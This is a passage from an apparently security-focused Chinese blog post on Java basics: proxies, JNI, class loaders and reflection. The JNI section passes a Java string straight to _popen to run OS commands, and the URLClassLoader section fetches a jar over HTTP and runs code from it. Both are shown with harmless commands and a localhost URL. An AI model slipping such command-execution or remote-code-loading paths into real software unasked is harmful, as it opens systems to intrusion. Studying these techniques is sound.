    <content type="html"><![CDATA[<h1 id="java-代理"><a href="#java-代理" class="headerlink" title="java 代理"></a>java 代理</h1><p>代理的作用，就是在原有类的代码不发生改动的情况下，添加新功能。起到一个修饰器的作用。</p><p>假设我们现在有个类，用于打印helloworld</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class hello&#123;</span><br><span class="line">    public void gogo()&#123;System.out.println(&quot;Hello Wrold&quot;);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们想在不改动hello类的前提下，在输出helloworld时同时输出当前时间到文件，达到日志的功能，该如何解决这个问题呢？以这个问题为切入点，开始学习代理。</p><h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>静态代理很简单，不用接触什么新技术。就是创建一个”继承已有的一个类<br>“的类，通过重写父类的方法，达到不改动原有类的基础上增添新功能。纸上得来终觉浅，用代码来说明一下吧。</p><p>以刚刚的输出helloworld的类为例。我们编写一个它的子类，并在其中重写其gogo方法，添加日志生成功能</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class hello&#123;</span><br><span class="line">    public void gogo()&#123;System.out.println(&quot;Hello Wrold&quot;);&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class static_hello_proxy extends hello&#123;</span><br><span class="line">    hello hello_obj;</span><br><span class="line">    static_hello_proxy(hello hello)&#123;</span><br><span class="line">        this.hello_obj &#x3D; hello;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void gogo()&#123;</span><br><span class="line">        log();</span><br><span class="line">        hello_obj.gogo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void log()&#123;</span><br><span class="line">        Date date &#x3D; new Date();</span><br><span class="line">        String value &#x3D; &quot;date:&quot;+date+&quot;\n&quot;;</span><br><span class="line">        FileWriter writer &#x3D; null;</span><br><span class="line">        try &#123;</span><br><span class="line">            writer &#x3D; new FileWriter(new File(&quot;log.txt&quot;),true);</span><br><span class="line">            writer.write(value);</span><br><span class="line">            writer.flush();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后主函数中我们只需调用static_hello_proxy中的gogo()方法就能达到日志功能了。这就是静态代理。<br>静态代理的缺点显而易见，如果我们想要代理不同的类，就要写出不同的静态代理类出来，同时我们也可能会遇到需要多个代理类来增添实现一个类的不同功能，有需要定义一大堆类出来。不容易维护，所以动态代理就诞生了，它很好的解决了静态代理会产生大量代理类的难题。</p><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>使用动态代理，可以不用创建代理类，非常的方便。</p><p>动态代理由Proxy.newProxyInstance方法实现。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219150752.png" alt="QQ截图20210219150752"></p><p>我们看看它的三个参数。<br>loader，顾名思义，就是被代理类的类加载器。<br>interfaces 被代理类所实现的接口，可通过 类对象.getinterfaces()获得<br>h 即 InvocationHandler接口类 的实现类，用于实现代理增添的方法</p><p>我们看看这个 InvocationHandler 类的结构。这个类只有一个invoke方法，且这个类是接口类。这个invoke方法就用于存放我们的增添的功能。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219150801.png" alt="QQ截图20210219150801"></p><p>proxy即代理对象，method即对象中的某个方法，args即方法中的参数。</p><p>ok，接下来把刚刚那个类动态代理一下吧。但是需要注意的是动态代理只能代理接口实现类。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileWriter;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.Date;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        hello hello_obj &#x3D; new hello();</span><br><span class="line">        ClassLoader Loader &#x3D; hello_obj.getClass().getClassLoader();</span><br><span class="line">        Class&lt;?&gt;[] Interfaces &#x3D; hello_obj.getClass().getInterfaces();</span><br><span class="line">        InvocationHandler ih &#x3D; new InvocationHandler() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;</span><br><span class="line">                if(method.getName()&#x3D;&#x3D;&quot;gogo&quot;)&#123;</span><br><span class="line">                    FileWriter writer &#x3D; new FileWriter(&quot;log.txt&quot;);</span><br><span class="line">                    writer.write(&quot;date:&quot;+new Date()+&quot;|by 动态代理\n&quot;);</span><br><span class="line">                    writer.flush();</span><br><span class="line">                    hello_obj.gogo();</span><br><span class="line">                &#125;</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        hello_interface proxy &#x3D; (hello_interface) Proxy.newProxyInstance(Loader,Interfaces,ih);  &#x2F;&#x2F;注意这里数据类型是接口的数据类型</span><br><span class="line">        proxy.gogo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface hello_interface&#123;</span><br><span class="line">    public void gogo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class hello implements hello_interface&#123;</span><br><span class="line">    public void gogo()&#123;System.out.println(&quot;Hello Wrold&quot;);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>OK,ALL DOWN</p><h1 id="JNI"><a href="#JNI" class="headerlink" title="JNI"></a>JNI</h1><p>JNI是JAVA的一个接口，用来实现c/c++调用，为JAVA提供了一个操纵底层的能力。</p><h2 id="JNI-HelloWorld"><a href="#JNI-HelloWorld" class="headerlink" title="JNI HelloWorld"></a>JNI HelloWorld</h2><p>java IDE：idea C IDE：vs2019</p><p>1.写好JAVA文件，定义好native方法。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class test &#123;</span><br><span class="line">    static&#123;</span><br><span class="line">        System.loadLibrary(&quot;Dll1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public native void hello();</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        test a &#x3D; new test();</span><br><span class="line">        a.hello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.使用javac指令为java文件的各native方法生成c语言头文件。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javac -cp . test.java -h .</span><br></pre></td></tr></table></figure><p>执行后会在当前目录下生成一个头文件</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219150831.png" alt="QQ截图20210219150831"></p><p>3.用vscode创建一个dll项目，将test.h与jdk include目录下的jni.h以及jdk/include/win32/jni_md.h统统移动到项目文件目录下。然后在vscode头文件里添加现有项，把刚刚放到项目文件下的3个头文件添加进去。</p><p>4.在c或c++中定义native方法的c/c++原型。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219150842.png" alt="QQ截图20210219150842"></p><p>通过test.h我们可以看到哪些方法需要我们定义。这里是Java_test_hello方法。</p><p>我们随便定义一下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;test.h&quot;</span><br><span class="line"></span><br><span class="line">JNIEXPORT void JNICALL Java_test_hello(JNIEnv* a, jobject b) &#123;</span><br><span class="line">printf(&quot;Hello,World&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译为dll文件。</p><p>5.在idea里为当前项目指定依赖dll文件路径</p><p>先点击箭头指向处的编辑选项，然后在虚拟机选项里填上-Djava.library.path=你的dll路径</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151203.png" alt="QQ截图20210219151203"></p><p>6.把dll文件拖进刚刚配置好的依赖路径，运行</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151203.png" alt="QQ截图20210219151203"></p><h2 id="JNI-数据类型"><a href="#JNI-数据类型" class="headerlink" title="JNI 数据类型"></a>JNI 数据类型</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151238.png" alt="QQ截图20210219151238"></p><p>JNI类型数据在c文件里当作传入参数和返回结果，参数传入后其数据类型会被用指定方法转换为C类型然后被处理，处理完毕后使用指定方法转换为JNI类型返回给JAVA。</p><p>这里介绍一下c中JNI类型与c类型互转的函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jstring转char*：env-&gt;GetStringUTFChars(str, &amp;jsCopy)</span><br><span class="line"></span><br><span class="line">char*转jstring: env-&gt;NewStringUTF(&quot;Hello...&quot;)</span><br><span class="line"></span><br><span class="line">字符串资源释放: env-&gt;ReleaseStringUTFChars(javaString, p);</span><br></pre></td></tr></table></figure><h2 id="JNI-实现本地命令执行"><a href="#JNI-实现本地命令执行" class="headerlink" title="JNI 实现本地命令执行"></a>JNI 实现本地命令执行</h2><p>相当于一个加强版的helloworld.</p><p>首先我们看一下，如果在c++中我们想执行本地命令执行该如何执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line"></span><br><span class="line">std::string gogo(const char* cmd) &#123;</span><br><span class="line">const char* cmd &#x3D; cmd;</span><br><span class="line">FILE* fp &#x3D; _popen(cmd, &quot;r&quot;);</span><br><span class="line">if (fp !&#x3D; NULL) &#123;</span><br><span class="line">std::string result;</span><br><span class="line">char buf[128];</span><br><span class="line">while (fgets(buf, sizeof(buf), fp) !&#x3D; NULL) &#123;</span><br><span class="line">result +&#x3D; buf;</span><br><span class="line">&#125;</span><br><span class="line">return result;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">std::string result &#x3D; gogo(&quot;dir&quot;);</span><br><span class="line">std::cout &lt;&lt; result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们在JNI里如何实现呢?其实也差不多.</p><p>我们现在写好java代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class test &#123;</span><br><span class="line">    static&#123;</span><br><span class="line">        System.loadLibrary(&quot;Dll2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public native String gogo(String cmd);</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        test a &#x3D; new test();</span><br><span class="line">        String str &#x3D; a.gogo(&quot;dir&quot;);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写好c++代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;test.h&quot;</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">JNIEXPORT jstring JNICALL Java_test_gogo(JNIEnv* env, jobject obj, jstring str) &#123;</span><br><span class="line"> const char* cmd &#x3D; env-&gt;GetStringUTFChars(str, 0);</span><br><span class="line"> FILE* fd &#x3D; _popen(cmd, &quot;r&quot;);</span><br><span class="line"> if (fd !&#x3D; NULL) &#123;</span><br><span class="line"> std::string result;</span><br><span class="line"> char buf[128];</span><br><span class="line"> while (fgets(buf, sizeof(buf), fd) !&#x3D; NULL) &#123;</span><br><span class="line"> result +&#x3D; buf;</span><br><span class="line"> &#125;</span><br><span class="line"> _pclose(fd);</span><br><span class="line"> return env-&gt;NewStringUTF(result.c_str());</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151248.png" alt="QQ截图20210219151248"></p><h1 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h1><h2 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h2><p>在JVM类加载器中最顶层的是<code>Bootstrap ClassLoader(引导类加载器)</code>、<code>Extension ClassLoader(扩展类加载器)</code>、<code>App ClassLoader(系统类加载器)</code>，<code>AppClassLoader</code>是默认的类加载器，如果类加载时我们不指定类加载器的情况下，默认会使用<code>AppClassLoader</code>加载类，<code>ClassLoader.getSystemClassLoader()</code>返回的系统类加载器也是<code>AppClassLoader</code>。</p><p>ClassLoader的主要方法有以下几个：</p><ol><li><code>loadClass</code>(加载指定的Java类)</li><li><code>findClass</code>(查找指定的Java类)</li><li><code>findLoadedClass</code>(查找JVM已经加载过的类)</li><li><code>defineClass</code>(定义一个Java类)</li><li><code>resolveClass</code>(链接指定的Java类)</li></ol><p>如何通过ClassLoader获取一个类对象？很简单</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class a &#x3D; ClassLoader.getSystemClassLoader().loadClass(&quot;java.lang.Runtime&quot;);</span><br></pre></td></tr></table></figure><p>它对一个类的加载流程如下:</p><ol><li>ClassLoader调用loadClass(String name)方法加载指定类</li><li>调用findLoadedClass检查指定的类是否已经初始化，若已初始化则直接返回类对象</li><li>如果创建ClassLoader时传入父类加载器，则使用父类加载器加载指定类，否则使用JVM的Bootstrap ClassLoader（引导类加载器）加载</li><li>如果以上步骤没有完成加载，则使用findClass方法尝试加载指定类</li><li>如果当前ClassLoader类没有重写findClass方法则直接返回异常。若重写了该方法且通过findClass找到了传入的类名的对应的类字节码，那么就会使用defineClass去JVM注册该类</li><li>如果loadClass调用时传入resolve的参数为true，则那么还需要调用resolveClass方法连接类。该参数默认为false</li><li>返回被JVM加载后的指定类的类对象</li></ol><h2 id="ClassLoader自定义"><a href="#ClassLoader自定义" class="headerlink" title="ClassLoader自定义"></a>ClassLoader自定义</h2><p>java.lang.ClassLoader 是所有类加载器的父类，我们可以通过重写其findClass方法来实现自定义ClassLoader。</p><p>我们试着自定义一个，当对loadClass传入com.anbai.sec.classloader.TestHelloWorld 时会直接返回一个在加载器里已经定义好了的对应类的类对象。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class TestClassLoader extends  ClassLoader&#123;</span><br><span class="line">    String testClassName&#x3D;&quot;com.anbai.sec.classloader.TestHelloWorld&quot;;</span><br><span class="line">    byte[] testClassBytes &#x3D; new byte[]&#123;-54, -2, -70, -66, 0, 0, 0, 51, 0, 17, 10, 0, 4, 0, 13, 8, 0, 14, 7, 0, 15, 7, 0,</span><br><span class="line">            16, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100,</span><br><span class="line">            101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101,</span><br><span class="line">            1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108,</span><br><span class="line">            97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99,</span><br><span class="line">            101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111,</span><br><span class="line">            114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 1, 0, 12, 72, 101, 108, 108, 111,</span><br><span class="line">            32, 87, 111, 114, 108, 100, 126, 1, 0, 40, 99, 111, 109, 47, 97, 110, 98, 97, 105, 47,</span><br><span class="line">            115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115,</span><br><span class="line">            116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108,</span><br><span class="line">            97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 1,</span><br><span class="line">            0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0,</span><br><span class="line">            1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 0, 1, 0, 9, 0, 10, 0, 1, 0, 7, 0, 0, 0, 27, 0, 1,</span><br><span class="line">            0, 1, 0, 0, 0, 3, 18, 2, -80, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11,</span><br><span class="line">            0, 0, 0, 2, 0, 12&#125;;  &#x2F;&#x2F;这部分是类字节码，是我从别人那里嫖的</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123;</span><br><span class="line">        if(name.equals(&quot;com.anbai.sec.classloader.TestHelloWorld&quot;))&#123;</span><br><span class="line">            return  defineClass(testClassName,testClassBytes,0,testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            return super.findClass(name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后主函数我们写</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        TestClassLoader Loader &#x3D; new TestClassLoader();</span><br><span class="line">        Class clazz &#x3D; Loader.loadClass(&quot;com.anbai.sec.classloader.TestHelloWorld&quot;);</span><br><span class="line">        Object Instance &#x3D; clazz.newInstance();</span><br><span class="line">        Method method &#x3D; Instance.getClass().getMethod(&quot;hello&quot;);</span><br><span class="line">        String str &#x3D; (String) method.invoke(Instance);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">    &#125;catch (Exception e)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经测试程序正常运行。我们的自定义ClassLoader就写好了。当然还有更多花里胡哨的重写方法，我们这里只是知道怎么重写即可。</p><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p>URLClassLoader也是ClassLoader类下的一个重写类。这个类很好用，它可以通过网络协议获取远程的jar包，然后通过类加载器去获得其中的指定类的类对象。试试吧。</p><p>流程是先定义一个URL对象指向我们的jar包，然后实例化一个URLClassLoader对象，然后通过loadClass加载某个类获得类对象。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">            try&#123;</span><br><span class="line">&#x2F;&#x2F;                Class clazz &#x3D; ClassLoader.getSystemClassLoader().loadClass(&quot;fuck&quot;);</span><br><span class="line">&#x2F;&#x2F;                Method method &#x3D; clazz.getMethod(&quot;func1&quot;,int.class);</span><br><span class="line">&#x2F;&#x2F;                method.invoke(clazz.newInstance(),123);</span><br><span class="line">                URL url &#x3D; new URL(&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;LOL.jar&quot;);</span><br><span class="line">                URLClassLoader Loader &#x3D; new URLClassLoader(new URL[]&#123;url&#125;);</span><br><span class="line">                Class clazz &#x3D; Loader.loadClass(&quot;fuck&quot;);</span><br><span class="line">                Method method &#x3D; clazz.getMethod(&quot;func1&quot;,int.class);</span><br><span class="line">                method.setAccessible(true);</span><br><span class="line">                method.invoke(clazz.newInstance(),123);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们jar包里的class是这个.JAVA的编译文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class fuck&#123;</span><br><span class="line">    public void func1(int input1)&#123;</span><br><span class="line">        System.out.print(input1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151315.png" alt="QQ截图20210219151315"></p><h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><h2 id="反射的基础"><a href="#反射的基础" class="headerlink" title="反射的基础"></a>反射的基础</h2><p>反射是java的一个特性，用于获取类的详细信息（方法，变量），并可以执行类中的方法。</p><h3 id="获得一个类的类对象"><a href="#获得一个类的类对象" class="headerlink" title="获得一个类的类对象"></a>获得一个类的类对象</h3><p>要获取类的详细信息或执行其中的方法，首先肯定是要获取到那个类的类对象</p><p>方法一:我们需要创建一个Class类型的变量，用于接收Class.forname(“类”)返回的类对象。这个方法必须通过try..catch 来处理其中ClassNotFoundException</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try&#123;</span><br><span class="line">Class clazz &#x3D; Class.forname(&quot;java.lang.String&quot;)；&#125;</span><br><span class="line">catch(ClassNotFoundException e)&#123;&#125;</span><br></pre></td></tr></table></figure><p>方法二:我们实例化一个类的对象出来，然后通过 对象.getClass()获得其类对象</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String a &#x3D; new String;</span><br><span class="line">Class clazz &#x3D; a.getclass();</span><br></pre></td></tr></table></figure><p>方法三:使用.class</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class clazz &#x3D; String.class;</span><br></pre></td></tr></table></figure><p>这样，我们就获得一个指定类的类对象了。很简单。我们可以对一个类对象使用getName()方法获取其类名。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">System.out.println(clazz.getName());</span><br></pre></td></tr></table></figure><h3 id="获取一个类对象的所有成员"><a href="#获取一个类对象的所有成员" class="headerlink" title="获取一个类对象的所有成员"></a>获取一个类对象的所有成员</h3><h4 id="获取属性并修改"><a href="#获取属性并修改" class="headerlink" title="获取属性并修改"></a>获取属性并修改</h4><p>对类对象使用 getFields() 或 getDeclaredFields() 方法即可获得属性数组，区别在于前者只能获取公有属性，后者能获取私有属性。<br>然后遍历属性数组，通过对每一项执行getName()获取属性名，get(实例化的对象)获得属性值<br>然后对某一项进行.set()对其进行修改<br>这里需要提的是，如果要获得或修改私有属性的值的时候，需要对私有属性使用setAccessible(true)来实现私有访问</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        Class clazz &#x3D; (new abc()).getClass();</span><br><span class="line">        abc test &#x3D; new abc();</span><br><span class="line">        Field[] Fields &#x3D; clazz.getDeclaredFields();</span><br><span class="line">        for(Field Field:Fields)&#123; &#x2F;&#x2F;遍历Fields数组</span><br><span class="line">            try &#123; &#x2F;&#x2F;执行get()方法时需抛出IllegalAccessException错误</span><br><span class="line">                Field.setAccessible(true);  &#x2F;&#x2F;对数组中的每一项实现私有访问</span><br><span class="line">                System.out.print(Field.getName());</span><br><span class="line">                Object value &#x3D; Field.get(new abc());</span><br><span class="line">                System.out.println(&quot;:&quot; + value);</span><br><span class="line">                Field.set(test,&quot;new&quot;);   &#x2F;&#x2F;修改test对象中的变量</span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(test.a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class abc&#123;</span><br><span class="line">    public String a &#x3D;new String(&quot;tom and mary&quot;);</span><br><span class="line">    private String b &#x3D; new String(&quot;abcdefg&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151405.png" alt="QQ截图20210219151405"></p><p>另外，你也可以通过getFiled(“属性名”)来获取特定属性的Filed对象， getDeclaredFields() 同理</p><h4 id="获取方法并执行"><a href="#获取方法并执行" class="headerlink" title="获取方法并执行"></a>获取方法并执行</h4><p>接下来是获取方法的一些信息<br>我们通过getMethod获取方法对象，然后通过getName获取方法名，getReturnType获取返回值类型，getParameterTypes获取传入的参数类型</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        Class clazz &#x3D; (new abc()).getClass();</span><br><span class="line">        Method[] methods &#x3D; clazz.getDeclaredMethods();</span><br><span class="line">        for(Method method:methods)&#123;</span><br><span class="line">            try&#123;</span><br><span class="line">                System.out.print(method.getName());</span><br><span class="line">                System.out.print(&quot;|retrunType:&quot;+method.getReturnType()+&quot;|&quot;);</span><br><span class="line">                Class[] ParameterTypes &#x3D; method.getParameterTypes();</span><br><span class="line">                for(Class ParameterType:ParameterTypes)&#123;</span><br><span class="line">                    System.out.print(&quot;ParamType:&quot;+ParameterType.getName());</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(&quot;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class abc&#123;</span><br><span class="line">    public int a &#x3D;1;</span><br><span class="line">    private String b &#x3D; new String(&quot;abcdefg&quot;);</span><br><span class="line"></span><br><span class="line">    public void func1(int input1)&#123;</span><br><span class="line">        System.out.print(input1);</span><br><span class="line">    &#125;</span><br><span class="line">    private void func2(int input1)&#123;</span><br><span class="line">        System.out.print(input1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是对method对象执行invoke方法调用，通过传入参数，指定对象，即可调用该方法。我在上述代码中添加了修改</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        Class clazz &#x3D; (new abc()).getClass();</span><br><span class="line">        Method[] methods &#x3D; clazz.getDeclaredMethods();</span><br><span class="line">        for(Method method:methods)&#123;</span><br><span class="line">            try&#123;</span><br><span class="line">                System.out.print(method.getName());</span><br><span class="line">                System.out.print(&quot;|retrunType:&quot;+method.getReturnType()+&quot;|&quot;);</span><br><span class="line">                Class[] ParameterTypes &#x3D; method.getParameterTypes();</span><br><span class="line">                for(Class ParameterType:ParameterTypes)&#123;</span><br><span class="line">                    System.out.print(&quot;ParamType:&quot;+ParameterType.getName());</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(&quot;&quot;);</span><br><span class="line">                method.setAccessible(true);  &#x2F;&#x2F;打开私有访问</span><br><span class="line">                method.invoke(new abc(),2);   &#x2F;&#x2F;new 这里invoke第一个参数指定实例化对象，之后的参数代表传入方法的参数</span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class abc&#123;</span><br><span class="line">    public int a &#x3D;1;</span><br><span class="line">    private String b &#x3D; new String(&quot;abcdefg&quot;);</span><br><span class="line"></span><br><span class="line">    public void func1(int input1)&#123;</span><br><span class="line">        System.out.print(input1);</span><br><span class="line">    &#125;</span><br><span class="line">    private void func2(int input1)&#123;</span><br><span class="line">        System.out.print(input1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="获取构造方法并执行"><a href="#获取构造方法并执行" class="headerlink" title="获取构造方法并执行"></a>获取构造方法并执行</h4><p>获得构造方法，主要是通过 getConstructors()和getDeclaredConstructors() ，后者能访问私有对象,下面是用遍历法获得所有构造函数信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">        Class clazz &#x3D; Class.forName(&quot;abc&quot;);</span><br><span class="line">        Constructor[] conArray &#x3D; clazz.getDeclaredConstructors();</span><br><span class="line">            for (Constructor a:conArray)&#123;</span><br><span class="line">                a.setAccessible(true);</span><br><span class="line">                System.out.println(a);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch(Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class abc&#123;</span><br><span class="line">    public abc(String name,int age)&#123;</span><br><span class="line">        System.out.println(&quot;姓名：&quot;+name+&quot;年龄：&quot;+ age);</span><br><span class="line">    &#125;</span><br><span class="line">    private abc(int age)&#123;</span><br><span class="line">        System.out.println(&quot;私有的构造方法   